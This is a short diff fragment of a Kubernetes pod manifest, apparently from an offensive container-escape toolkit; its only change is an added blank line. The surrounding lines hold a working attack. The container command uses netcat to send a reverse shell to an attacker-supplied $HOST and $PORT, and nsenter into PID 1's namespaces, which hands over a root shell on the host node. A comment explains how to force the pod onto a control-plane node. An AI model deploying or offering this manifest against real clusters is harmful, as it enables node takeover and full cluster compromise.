@@ -17,3 +17,4 @@ spec:
         command: [ "/bin/nc", "$HOST", "$PORT", "-e", "/bin/nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "/bin/bash"]
       #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
       restartPolicy: OnFailure
+
